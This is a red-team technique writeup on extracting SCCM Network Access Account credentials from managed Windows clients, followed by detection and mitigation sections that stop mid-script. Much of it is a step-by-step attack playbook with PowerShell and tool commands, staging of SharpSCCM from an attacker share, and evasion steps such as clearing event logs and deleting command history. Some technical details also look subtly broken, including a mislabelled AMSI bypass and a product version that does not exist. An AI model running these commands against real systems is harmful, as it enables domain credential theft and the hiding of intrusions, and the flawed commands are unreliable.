# [PE-VALID-009]: SCCM NAA Privilege Escalation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-009 |
| **MITRE ATT&CK v18.1** | [T1078.002 - Valid Accounts: Domain Accounts](https://attack.mitre.org/techniques/T1078/002/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Windows AD |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2016-2025, SCCM 2012 R2 - Current Branch |
| **Patched In** | N/A (Design flaw; mitigated via Enhanced HTTP or PKI) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** System Center Configuration Manager (SCCM) Network Access Accounts (NAA) are legacy domain accounts designed to enable non-domain-joined devices to retrieve software and updates from distribution points during deployment. When SCCM clients are enrolled in an organization, the NAA credentials are transmitted to every managed device and stored locally in the WMI repository, encrypted with Data Protection API (DPAPI). An attacker with local administrator privileges on an SCCM-managed client can extract these credentials from the system and decrypt them to obtain cleartext domain credentials. If the NAA account is overprivileged (a common misconfiguration), this provides a pathway to escalate privileges within the domain—potentially achieving local administrator access on multiple servers, database access, or even tier-0 domain admin status through further exploitation.

**Attack Surface:** SCCM client machines (CCM namespace `Root\CCM\Policy\Machine\actualconfig`), local WMI repository (`C:\Windows\System32\wbem\Repository\OBJECTS.DATA`), SCCM HTTP management points (port 80/443).

**Business Impact:** **Complete compromise of Active Directory infrastructure**. Overprivileged NAA accounts frequently grant access to LAPS passwords, SCCM database admin rights, or even domain administrative privileges, enabling attackers to move laterally across the entire enterprise, deploy malicious software to thousands of endpoints, or exfiltrate sensitive data.

**Technical Context:** NAA extraction typically takes 2-5 minutes once local admin access is obtained. The technique generates moderate event logging (WMI access, process creation) but often escapes detection due to the legitimate nature of SCCM management processes. The attack chain is largely reversible once detected, but the underlying credential exposure persists on all historically SCCM-managed machines unless explicitly remediated.

### Operational Risk

- **Execution Risk:** High – Requires local administrator privileges on an SCCM client, but this access is frequently available through initial compromise or lateral movement.
- **Stealth:** Medium – Generates some WMI query logs and process creation events (svchost, WMIC), but these are common in SCCM environments and often not monitored.
- **Reversibility:** No – Once NAA credentials are compromised, the account must be disabled and removed from all SCCM clients to prevent further exploitation. Legacy NAA credentials persist on uninstalled clients.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 18.1.1.1 | Ensure 'Configuration Manager' is set to a high standard of security and privilege separation |
| **DISA STIG** | WN10-00-000001 | Windows Defender must be configured with non-default settings |
| **CISA SCuBA** | CA-7.1 | Implement and maintain access controls and restrictions based on the principle of least privilege |
| **NIST 800-53** | AC-3 | Access Enforcement – Enforce approved authorizations for logical access to resources |
| **GDPR** | Art. 32(1)(b) | Ensure appropriate technical measures for security of personal data processing |
| **DORA** | Art. 9 | Protection and Prevention – Implement effective controls against ICT incidents |
| **NIS2** | Art. 21(1)(a) | Implement risk management measures for cyber risk management |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights – Restrict and manage privileged access rights |
| **ISO 27005** | Risk Scenario | Compromise of administrative credentials leading to unauthorized system access |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Local Administrator on an SCCM-managed client machine OR domain credentials + machine account registration quota (default: 10 devices per user).
- **Required Access:** Network connectivity to an SCCM management point (HTTP/HTTPS port 80/443) or local access to a managed device.

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025 (all editions)
- **SCCM:** Configuration Manager 2012 R2 through Current Branch (CB)
- **PowerShell:** Version 3.0+
- **Python:** 3.6+ (for sccmsecrets.py, sccmhunter)
- **C#/.NET:** .NET Framework 4.5+ (for SharpSCCM)

**Required Tools:**
- [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (Post-exploitation for SCCM)
- [sccmsecrets.py](https://github.com/synacktiv/SCCMSecrets) (Policy exploitation)
- [sccmhunter](https://github.com/garrettfoster13/sccmhunter) (SCCM reconnaissance and exploitation)
- [Rubeus](https://github.com/GhostPack/Rubeus) (Kerberos ticket manipulation, optional for follow-on attacks)
- Native Windows tools: `wmic.exe`, `Get-WmiObject` (PowerShell), `reg.exe`, `certutil.exe`

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

#### Step 1: Identify SCCM-Managed Machines in the Environment

```powershell
# Check if current machine is SCCM client
Get-Service -Name ccmexec -ErrorAction SilentlyContinue
if ($?) { Write-Host "SCCM Client is installed" } else { Write-Host "No SCCM Client" }

# Alternative: Check for SCCM WMI namespace
Get-WmiObject -Namespace "root\ccm" -Query "SELECT * FROM SMS_Client" -ErrorAction SilentlyContinue
```

**What to Look For:**
- Service `ccmexec` running indicates an active SCCM client.
- WMI queries returning results confirm SCCM policy presence.
- Success indicates the machine is eligible for NAA credential extraction.

#### Step 2: Enumerate NAA in Active Directory

```powershell
# Search AD for SCCM-related accounts and groups
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(objectClass=user) -and (name=*NAA* -or name=*SCCM*)"
$results = $searcher.FindAll()
$results | Select-Object -ExpandProperty Properties | ForEach-Object { $_.name }

# Alternative: Use Get-ADUser (if AD module available)
Get-ADUser -Filter 'Name -like "*NAA*" -or Name -like "*SCCM*"' -Properties Description, MemberOf
```

**What to Look For:**
- NAA accounts typically named with pattern: `{DOMAIN}_NAA`, `SCCM_{SITECODE}_NAA`, or similar.
- Review the `MemberOf` property to identify privilege levels (e.g., membership in admin groups).
- Check `Description` field for deployment notes or privilege notes.

#### Step 3: Query SCCM Management Points via LDAP

```powershell
# Find SCCM Management Points in AD
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(objectCategory=computer) -and (name=*MP*)"
$mpServers = $searcher.FindAll() | Select-Object -ExpandProperty Properties
$mpServers | ForEach-Object { Write-Host "MP Server: $($_.name)" }
```

**What to Look For:**
- Management points (MP) are central coordination servers.
- HTTP/HTTPS accessibility from target machines indicates a viable attack surface.

### Linux/Bash / CLI Reconnaissance

#### Step 1: Network Reconnaissance for SCCM Services (from Linux pivot)

```bash
# Scan for SCCM HTTP endpoints
nmap -p 80,443,10123 --script=http-title <target-subnet>/24 2>/dev/null | grep -i SCCM

# Query DNS for SCCM management points
nslookup -type=SRV _sms_mp._tcp.dc._msdcs.<domain.com>

# Check for SCCM HTTP endpoints via HTTP fingerprinting
curl -I http://<sccm-mp>/ccm_system_windowsauth/request 2>/dev/null | head -10
```

**What to Look For:**
- HTTP 401/403 responses from paths like `/ccm_system_*` indicate SCCM endpoints.
- DNS SRV records reveal management point addresses.

#### Step 2: Enumerate SCCM via sccmhunter (Linux)

```bash
python3 sccmhunter.py http -u "<domain>\<username>" -p "<password>" -d "<domain>" -dc-ip <dc-ip> -auto
```

**What to Look For:**
- Output will list SCCM configuration, accessible management points, and NAA status.
- "Enhanced HTTP: No" indicates vulnerability to NAA extraction.

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Extract NAA via WMI from Local SCCM Client (Requires Local Admin)

**Supported Versions:** Server 2016-2025, SCCM 2012 R2+

#### Step 1: Obtain Local Administrator Privileges

**Objective:** Establish local administrator context on an SCCM-managed machine.

**Execution Methods:**
- Exploit a local privilege escalation vulnerability (e.g., PrintNightmare, ZeroLogon).
- Obtain credentials of a local administrator account.
- Use credential theft techniques (Mimikatz, etc.) to dump local admin hashes.

#### Step 2: Extract NAA Credentials via WMI Query

**Objective:** Query the WMI repository to retrieve encrypted NAA credentials.

**Command (All Versions):**
```powershell
# Run as Local Administrator (via runas or already-elevated session)
$ccmNamespace = "root\ccm\policy\machine\actualconfig"
$naaPolicies = Get-WmiObject -Namespace $ccmNamespace -Query "SELECT * FROM CCM_NetworkAccessAccount" -ErrorAction SilentlyContinue

foreach ($naa in $naaPolicies) {
    Write-Host "NAA Username: $($naa.NetworkAccessUsername)"
    Write-Host "NAA Password (Encrypted): $($naa.NetworkAccessPassword)"
    Write-Host "Scope: $($naa.ScopeID)"
}
```

**Expected Output:**
```
NAA Username: CONTOSO\CONTOSO_NAA
NAA Password (Encrypted): 01000000D08C9DDF011530000000000F...
Scope: SMS0001S
```

**What This Means:**
- The `NetworkAccessUsername` field contains the NAA account name.
- The `NetworkAccessPassword` field contains the DPAPI-encrypted password blob.
- The `ScopeID` identifies which SCCM site this policy applies to.

**OpSec & Evasion:**
- Disable AMSI temporarily to avoid command-line blocking: `$ExecutionContext.SessionState.LanguageMode = 'FullLanguage'`
- Execute from a temporary PowerShell profile to minimize process tree exposure.
- Immediately clear event logs: `Clear-EventLog -LogName "Microsoft-Windows-WMI-Activity/Operational"` (requires admin)
- Detection likelihood: **Medium** – WMI access to CCM namespace generates Event ID 5857 if logging is enabled.

**Troubleshooting:**
- **Error:** `Get-WmiObject : Invalid namespace "root\ccm\policy\machine\actualconfig"`
  - **Cause:** SCCM client not installed or not properly configured.
  - **Fix (All Versions):** Verify SCCM client is running: `Get-Service -Name ccmexec`. If not running, install the client from deployment.

- **Error:** `Access Denied` accessing WMI namespace.
  - **Cause:** Insufficient privileges (not local administrator).
  - **Fix (All Versions):** Escalate privileges via UAC bypass or local privilege escalation.

#### Step 3: Decrypt NAA Password Blob (DPAPI Decryption)

**Objective:** Convert encrypted DPAPI blob to cleartext password.

**Command (Windows Native - PowerShell):**
```powershell
# Use DPAPI to decrypt the NAA password blob
$encryptedBlob = "01000000D08C9DDF011530000000000F..."  # From Step 2
$decryptedBlob = [System.Security.Cryptography.ProtectedData]::Unprotect(
    [Convert]::FromBase64String($encryptedBlob),
    $null,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
)
$clearPassword = [System.Text.Encoding]::UTF8.GetString($decryptedBlob)
Write-Host "NAA Password (Cleartext): $clearPassword"
```

**Expected Output:**
```
NAA Password (Cleartext): Sup3rC0mpl3xP@ssw0rd!#2024
```

**OpSec & Evasion:**
- Decrypt in a custom script to avoid leaving cleartext in PowerShell history: `Remove-Item (Get-PSReadlineOption).HistorySavePath -Force`
- Use DPAPI decryption directly within C# (SharpSCCM) to avoid PowerShell logging.
- Detection likelihood: **Low** – No specific event for DPAPI decryption at local scope.

**Troubleshooting:**
- **Error:** `Cannot decrypt blob` or `CryptographicException`
  - **Cause:** Blob is encrypted for a different user context or machine key is unavailable.
  - **Fix (All Versions):** Run decryption command as the SYSTEM user (using scheduled task or service context): 
    ```powershell
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command {decryption script}"
    Register-ScheduledTask -Action $action -TaskName "TempTask" -Force
    Start-ScheduledTask -TaskName "TempTask"
    ```

**References & Proofs:**
- [SpecterOps: The Phantom Credentials of SCCM](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)
- [GuidePoint Security: SCCM Exploitation](https://www.guidepointsecurity.com/blog/sccm-exploitation-compromising-network-access-accounts/)
- [DPAPI Decryption Documentation](https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.protecteddata)

#### Step 4: Validate NAA Credentials

**Objective:** Confirm that extracted credentials are valid and functional.

**Command (PowerShell):**
```powershell
$naaUser = "CONTOSO\CONTOSO_NAA"
$naaPassword = "Sup3rC0mpl3xP@ssw0rd!#2024"
$securePassword = ConvertTo-SecureString -String $naaPassword -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $naaUser, $securePassword

# Test authentication against a distribution point or domain resource
try {
    Get-ADUser -Filter * -Credential $credential -ErrorAction Stop | Out-Null
    Write-Host "NAA Credentials are VALID"
} catch {
    Write-Host "NAA Credentials are INVALID or account is locked"
}
```

**Expected Output (Valid):**
```
NAA Credentials are VALID
```

**What This Means:**
- The extracted credentials successfully authenticate to Active Directory.
- The NAA account is still enabled and not locked out.

#### Step 5: Assess NAA Privilege Level

**Objective:** Identify what privileges the NAA account possesses (local admin, domain admin, group membership, etc.).

**Command (PowerShell):**
```powershell
# Check if NAA has local administrator rights on multiple servers
$naaUser = "CONTOSO\CONTOSO_NAA"
$naaPassword = "Sup3rC0mpl3xP@ssw0rd!#2024"
$securePassword = ConvertTo-SecureString -String $naaPassword -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential -ArgumentList $naaUser, $securePassword

# Query AD for NAA group memberships
$adUser = Get-ADUser -Identity $naaUser -Properties MemberOf -Credential $credential
$adUser.MemberOf | ForEach-Object {
    $group = Get-ADGroup -Identity $_ -Credential $credential
    Write-Host "NAA is member of: $($group.Name)"
}

# Check for domain admin membership
if ($adUser.MemberOf -like "*Domain Admins*") {
    Write-Host "**CRITICAL: NAA account is member of Domain Admins**"
}

# Check LAPS read permissions on OUs
Get-ADObject -Filter 'ObjectClass -eq "organizationalUnit"' -Properties nTSecurityDescriptor | ForEach-Object {
    $acl = Get-Acl -Path "AD:\$($_.DistinguishedName)"
    $lapsRules = $acl.Access | Where-Object { $_.IdentityReference -eq $naaUser -and $_.ActiveDirectoryRights -like "*ExtendedRight*" }
    if ($lapsRules) {
        Write-Host "NAA can read LAPS passwords in OU: $($_.Name)"
    }
}
```

**Expected Output (Overprivileged):**
```
NAA is member of: Tier-1 Admins
NAA is member of: Server Admins
**CRITICAL: NAA account is member of Domain Admins**
NAA can read LAPS passwords in OU: Servers
```

**What This Means:**
- If NAA is member of admin groups, it represents a critical privilege escalation path.
- LAPS read permissions allow access to local admin passwords on hundreds of machines.
- Domain admin membership grants complete infrastructure compromise.

---

### METHOD 2: Extract NAA via SharpSCCM (Windows Post-Exploitation Tool)

**Supported Versions:** Server 2016-2025, SCCM 2012 R2+

#### Step 1: Deploy SharpSCCM Binary

**Objective:** Compile or transfer the SharpSCCM tool to the target SCCM client.

**Command (Compilation - on attacking machine):**
```bash
# Clone SharpSCCM repository
git clone https://github.com/Mayyhem/SharpSCCM.git
cd SharpSCCM

# Compile with Visual Studio or msbuild
msbuild SharpSCCM.sln /p:Configuration=Release /p:Platform=x64

# Binary location: bin/Release/SharpSCCM.exe
```

**Deployment (on target):**
```powershell
# Transfer to target via SMB, HTTP, or clipboard
# Run from temporary location (C:\Windows\Temp\)
Copy-Item -Path "\\attacker\share\SharpSCCM.exe" -Destination "C:\Windows\Temp\SharpSCCM.exe"
```

#### Step 2: Extract NAA via Disk Method

**Objective:** Extract NAA credentials directly from SCCM client filesystem.

**Command (Target Machine - Local Admin):**
```cmd
C:\Windows\Temp\SharpSCCM.exe local secrets -m disk
```

**Expected Output:**
```
[+] Generating CCM Key from Local WMI Repository...
[*] Attempting to decrypted secrets...
[+] Found NAA:
    Username: CONTOSO\CONTOSO_NAA
    Password: Sup3rC0mpl3xP@ssw0rd!#2024
```

**What This Means:**
- SharpSCCM automatically decrypts the DPAPI blob using the local machine key.
- The cleartext NAA credentials are displayed for immediate use.

**OpSec & Evasion:**
- Delete the SharpSCCM binary immediately: `Remove-Item C:\Windows\Temp\SharpSCCM.exe -Force`
- Clear CommandLine audit logs: Requires admin + log deletion capability.
- Detection likelihood: **Medium-High** – .NET assembly execution and File I/O may trigger EDR alerts.

#### Step 3: Extract NAA via WMI Method

**Objective:** Extract NAA credentials from WMI namespace (alternative to disk method).

**Command (Target Machine - Local Admin):**
```cmd
C:\Windows\Temp\SharpSCCM.exe local secrets -m wmi
```

**Expected Output:**
```
[+] Querying WMI Namespace for Secrets...
[+] Found NAA:
    Username: CONTOSO\CONTOSO_NAA
    Password: Sup3rC0mpl3xP@ssw0rd!#2024
    Scope: SMS0001S
```

**What This Means:**
- Same result as PowerShell method but automated via C#.
- Slightly stealthier than PowerShell due to avoiding script execution.

---

### METHOD 3: Extract NAA via sccmsecrets.py (Linux/Cross-Platform)

**Supported Versions:** SCCM 2012 R2+, targeting any HTTP-accessible SCCM endpoint

#### Step 1: Register a New Machine Device (Device Quota Abuse)

**Objective:** Create a machine account using standard domain computer account quota (default: 10 devices per user).

**Command (Linux - as Domain User):**
```bash
# Use addcomputer.py to add a machine account
addcomputer.py -computer-name 'ATTACKER$' -computer-pass 'P@ssw0rd123!' \
  -dc-ip 10.10.10.10 'contoso.com/username:password'

# Output:
# [*] Successfully added computer account ATTACKER$ with password: P@ssw0rd123!
```

**What This Means:**
- Creates a new domain-joined computer account (ATTACKER$).
- This account is immediately eligible to request SCCM policies including NAA.

#### Step 2: Authenticate to SCCM Management Point

**Objective:** Connect to SCCM HTTP endpoint using the newly created machine account.

**Command (Linux):**
```bash
python3 sccmsecrets.py dpapi -u "ATTACKER$" -p "P@ssw0rd123!" \
  -d contoso.com -dc-ip 10.10.10.10 -both

# Output:
# [*] Attempting to register new device with SCCM...
# [+] Successfully retrieved policy from Management Point
# [+] Decrypted NAA:
#     Username: CONTOSO\CONTOSO_NAA
#     Password: Sup3rC0mpl3xP@ssw0rd!#2024
```

**What This Means:**
- sccmsecrets.py automatically requests and decrypts the NAA policy.
- No local admin required; only ability to create machine accounts in domain.

**OpSec & Evasion:**
- Use random machine names to avoid detection: `COMPUTER_$(shuf -i 1000-9999 -n 1)`
- Immediately delete the created machine account after extraction: `Remove-ADComputer -Identity "ATTACKER$" -Confirm:$false`
- Detection likelihood: **Medium** – Computer account creation (Event ID 4741) and HTTP policy requests may be logged.

---

### METHOD 4: Extract NAA via sccmhunter (Automated, Multi-Purpose)

**Supported Versions:** SCCM 2012 R2+ (Current Branch)

#### Step 1: Automated SCCM Reconnaissance and Exploitation

**Objective:** Perform automated SCCM environment mapping and NAA extraction.

**Command (Linux/Windows):**
```bash
# Full automated enumeration and extraction
python3 sccmhunter.py http -u "contoso\username" -p "password" \
  -d contoso.com -dc-ip 10.10.10.10 -auto

# Output will include:
# [+] Management Points Found: MP1.contoso.com, MP2.contoso.com
# [+] Enhanced HTTP: No (Vulnerable to NAA extraction)
# [+] NAA Account: CONTOSO_NAA
# [+] NAA Password: Sup3rC0mpl3xP@ssw0rd!#2024
# [+] NAA Privileges: Member of Tier-1 Admins group
```

**What This Means:**
- sccmhunter provides comprehensive SCCM topology mapping.
- Automatically identifies NAA extraction vulnerabilities.
- Validates extracted credentials and assesses privilege levels.

**OpSec & Evasion:**
- Use `-stealth` flag to reduce HTTP request volume and timing patterns.
- Distribute requests over time intervals: `-delay 30` (30 seconds between requests).
- Detection likelihood: **Medium** – HTTP requests to SCCM endpoints are logged if monitoring is enabled.

---

## 6. ATTACK SIMULATION & VERIFICATION

This technique does not map to standardized Atomic Red Team tests due to its dependence on environmental SCCM configuration. However, verification can be achieved through:

1. **Test in Lab Environment:**
   - Deploy SCCM with NAA enabled in a controlled environment.
   - Execute Steps 1-4 of Method 1 to confirm NAA extraction.
   - Validate that extracted credentials authenticate successfully.

2. **Blue Team Detection Verification:**
   - Enable SCCM and WMI audit logging on test machines.
   - Execute NAA extraction methods.
   - Confirm that detection rules fire appropriately.

---

## 7. TOOLS & COMMANDS REFERENCE

### SharpSCCM

**Repository:** [Mayyhem/SharpSCCM](https://github.com/Mayyhem/SharpSCCM)

**Version:** 1.x (Latest commit-based versioning)

**Minimum Version:** 1.0

**Supported Platforms:** Windows (all versions with .NET Framework 4.5+)

**Version-Specific Notes:**
- **1.0+:** Core functionality for WMI and disk-based NAA extraction.
- **Latest:** Added remote management point interaction and certificate registration.

**Installation:**
```bash
git clone https://github.com/Mayyhem/SharpSCCM.git
cd SharpSCCM
msbuild SharpSCCM.sln /p:Configuration=Release /p:Platform=x64
# Binary: bin/Release/SharpSCCM.exe
```

**Usage:**
```cmd
# Extract NAA from local machine (requires local admin)
SharpSCCM.exe local secrets -m disk
SharpSCCM.exe local secrets -m wmi

# Enumerate SCCM environment
SharpSCCM.exe get naa
SharpSCCM.exe get sites
```

### sccmsecrets.py

**Repository:** [synacktiv/SCCMSecrets](https://github.com/synacktiv/SCCMSecrets)

**Version:** Latest (Python-based)

**Minimum Version:** 1.0

**Supported Platforms:** Linux, macOS, Windows (with Python 3.6+)

**Installation:**
```bash
git clone https://github.com/synacktiv/SCCMSecrets.git
cd SCCMSecrets
pip install -r requirements.txt
```

**Usage:**
```bash
# Extract NAA via DPAPI decryption
python3 sccmsecrets.py dpapi -u "ATTACKER$" -p "Password" -d domain.com -dc-ip 10.10.10.10

# Extract NAA via policy request
python3 sccmsecrets.py http -u "domain\user" -p "password" -mp "mp.domain.com"
```

### sccmhunter

**Repository:** [garrettfoster13/sccmhunter](https://github.com/garrettfoster13/sccmhunter)

**Version:** Latest (Python-based)

**Installation:**
```bash
git clone https://github.com/garrettfoster13/sccmhunter.git
cd sccmhunter
pip install -r requirements.txt
```

**Usage:**
```bash
# Automated SCCM enumeration and NAA extraction
python3 sccmhunter.py http -u "domain\user" -p "password" -d domain.com -dc-ip 10.10.10.10 -auto

# Stealthy extraction with delays
python3 sccmhunter.py http -u "domain\user" -p "password" -d domain.com -dc-ip 10.10.10.10 -stealth -delay 30
```

---

## 8. MICROSOFT SENTINEL DETECTION

### Query 1: Suspicious WMI Access to CCM_NetworkAccessAccount

**Rule Configuration:**
- **Required Table:** WmiEvent, DeviceProcessEvents
- **Required Fields:** EventType, ProcessName, TargetLogonId, CommandLine
- **Alert Severity:** High
- **Frequency:** Real-time
- **Applies To Versions:** All

**KQL Query:**
```kusto
// Detect suspicious WMI queries targeting CCM_NetworkAccessAccount
WmiEvent
| where EventType == "Query" 
    and Namespace contains "root\\ccm\\policy\\machine\\actualconfig"
    and Query contains "CCM_NetworkAccessAccount"
    and TimeGenerated > ago(24h)
| join kind=inner (
    SecurityEvent
    | where EventID == 4688
        and CommandLine contains "powershell" or CommandLine contains "wmic"
    | project ProcessName, CommandLine, TimeGenerated, Computer
) on Computer
| summarize Count = count() by Computer, ProcessName, Query, TimeGenerated
| where Count > 0
```

**What This Detects:**
- WMI queries specifically targeting the CCM_NetworkAccessAccount class.
- Correlation with process creation events for PowerShell or WMIC execution.
- Identifies systems where NAA extraction is being attempted.

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Suspicious CCM_NetworkAccessAccount WMI Query`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create**

### Query 2: Machine Account Creation in Computer Quota Exhaustion Pattern

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, TargetResources, InitiatedByUser
- **Alert Severity:** Medium
- **Frequency:** 30 minutes
- **Applies To Versions:** All

**KQL Query:**
```kusto
// Detect rapid machine account creation (device quota abuse)
AuditLogs
| where OperationName == "Add computer"
    and Result == "Success"
    and TimeGenerated > ago(24h)
| summarize MachineCount = dcount(TargetResources), 
            FirstCreation = min(TimeGenerated),
            LastCreation = max(TimeGenerated)
            by InitiatedByUser, ResourceId
| where MachineCount >= 5  // Alert if a user creates 5+ machines in 24h
| project InitiatedByUser, MachineCount, FirstCreation, LastCreation, ResourceId
```

**What This Detects:**
- Rapid machine account creation exceeding normal administrative patterns.
- Potential device quota abuse to register fake SCCM clients and extract NAA.

---

## 9. WINDOWS EVENT LOG MONITORING

### Event ID 4688: Process Creation (PowerShell / WMIC Access)

**Log Source:** Security

**Trigger:** Execution of `powershell.exe`, `wmic.exe`, or process access to `wbem\Repository\OBJECTS.DATA`

**Filter:** CommandLine contains 'Get-WmiObject', 'CCM_NetworkAccessAccount', or 'OBJECTS.DATA'

**Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Detailed Tracking**
3. Enable **Audit Process Creation** (Success and Failure)
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Detection Rule (Windows Event Log):**
```xml
<Rule id="NAA_Extraction_PowerShell" version="1">
  <Correlation name="CCM_NAA_Extraction" failureCount="1" timeWindow="300">
    <Event path="Security" eventID="4688">
      <Data name="CommandLine" condition="contains">Get-WmiObject</Data>
      <Data name="CommandLine" condition="contains">CCM_NetworkAccessAccount</Data>
    </Event>
  </Correlation>
</Rule>
```

### Event ID 5857: WMI Activity (Root\CCM access)

**Log Source:** Microsoft-Windows-WMI-Activity/Operational

**Trigger:** WMI query to `Root\CCM\Policy\Machine\ActualConfig`

**Filter:** Name contains 'CCM_NetworkAccessAccount'

**Applies To Versions:** Server 2016+ (requires WMI audit logging enabled)

**Manual Configuration Steps (Enable WMI Audit Logging):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Object Access**
3. Enable **Audit Other Object Access Events** (Success and Failure)
4. Run `gpupdate /force`
5. Restart the machine or execute: `auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable`

---

## 10. MICROSOFT DEFENDER FOR CLOUD

### Alert: Suspicious WMI Query for Sensitive Data

**Alert Name:** `Suspicious WMI activity detected`

**Severity:** High

**Description:** Microsoft Defender for Servers detects WMI queries to sensitive namespaces like `Root\CCM\Policy\Machine\ActualConfig`, which may indicate credential harvesting attempts.

**Applies To:** Virtual Machines with Defender for Servers enabled

**Remediation Steps:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud** → **Security alerts**
2. Locate the alert `Suspicious WMI activity detected`
3. Click on the alert to view impacted resources
4. **Immediate Actions:**
   - Isolate the affected VM: **Disconnect network interface**
   - Collect forensic evidence (memory dump, event logs)
   - Rotate credentials for all sensitive accounts (especially NAA)
5. **Investigation:**
   - Review Windows Event Log 4688 for suspicious process execution
   - Check for credential usage from compromised NAA account
   - Scan for lateral movement attempts

**Manual Configuration Steps (Enable Defender for Servers):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Servers Plan 2**: Recommended for enhanced detection
5. Click **Save**

---

## 11. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

### Query: Computer Account Creation (Device Quota Abuse)

```powershell
Search-UnifiedAuditLog -Operations "Add computer" -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) | 
  Select-Object @{n='User';e={$_.UserIds}}, @{n='Operation';e={$_.Operations}}, @{n='Timestamp';e={$_.CreationDate}}, @{n='Details';e={$_.AuditData}} |
  Export-Csv -Path "C:\Audit\computer_creation.csv"
```

**Workload:** Azure Active Directory

**Details to Analyze:**
- Identify which users are creating machine accounts.
- Look for patterns of rapid account creation (potential quota abuse).
- Cross-reference with SCCM management point activity.

**Manual Configuration Steps (Enable Unified Audit Log):**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** (left menu) → **Audit log search**
3. If not enabled, click **Turn on auditing**
4. Wait 24 hours for log retention to activate
5. To search:
   - **Date range:** Select start/end dates
   - **Activities:** Select **Add computer**
   - **Users:** Leave blank for all users
   - Click **Search**

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Transition from NAA to Enhanced HTTP:** Microsoft's recommended solution. Enhanced HTTP eliminates the need for cleartext credential distribution.
  
  **Applies To Versions:** SCCM 2019+ (SCCM 2012 R2: Not supported; requires upgrade)
  
  **Manual Steps (SCCM Console):**
  1. Open **Configuration Manager** → **Administration** → **Site Configuration** → **Sites**
  2. Right-click site → **Properties** → **Communication Security** tab
  3. Set **HTTP site system communication** to **HTTPS only**
  4. Enable **Use Configuration Manager-generated certificates for HTTP site systems**
  5. Click **OK** → **Close**
  6. Monitor **ConfigMgrSetup.log** for certificate deployment completion
  
  **Validation Command:**
  ```powershell
  # Verify Enhanced HTTP is enabled on management points
  $mgmtPoint = Get-CMManagementPoint
  $mgmtPoint | Select-Object -Property ServerName, EnableCloudGateway, EnableEnhancedHttp
  ```
  
  **Expected Output (If Secure):**
  ```
  ServerName             EnableEnhancedHttp
  MP1.contoso.com        True
  MP2.contoso.com        True
  ```

- **Disable and Remove NAA Accounts from Active Directory:** Once Enhanced HTTP is deployed, NAA accounts must be disabled to prevent compromise of legacy credentials.
  
  **Manual Steps (PowerShell):**
  ```powershell
  # Step 1: Disable the NAA account
  $naaAccount = Get-ADUser -Filter {Name -like "*NAA*"}
  Disable-ADAccount -Identity $naaAccount
  Set-ADAccountPassword -Identity $naaAccount -NewPassword (ConvertTo-SecureString -AsPlainText "TempComplexPassword$(Get-Random)" -Force)
  
  # Step 2: Remove from all groups
  Get-ADUser -Identity $naaAccount -Properties MemberOf | ForEach-Object {
    $_.MemberOf | Remove-ADGroupMember -Members $naaAccount -Confirm:$false
  }
  
  # Step 3: Remove the account from Active Directory
  Remove-ADUser -Identity $naaAccount -Confirm:$false
  
  # Step 4: Remove NAA from SCCM Configuration
  # Login to SCCM Console → Administration → Site Configuration → Sites
  # Select site → Properties → Network Access Account → Clear credentials
  ```

- **Remove NAA Credential Blobs from All Client Machines:** Even after disabling NAA in SCCM, credentials persist on client machines in the WMI repository.
  
  **Applies To Versions:** Server 2016-2025
  
  **Manual Steps (PowerShell - Deployment via Group Policy):**
  ```powershell
  # This script removes NAA credentials from local WMI repository
  $ccmNamespace = "root\ccm\policy\machine\actualconfig"
  $naaInstances = Get-WmiObject -Namespace $ccmNamespace -Query "SELECT * FROM CCM_NetworkAccessAccount"
  
  foreach ($instance in $naaInstances) {
      $instance.Delete()
      Write-Host "Removed NAA credential blob from WMI"
  }
  
  # Also remove from OBJECTS.DATA file
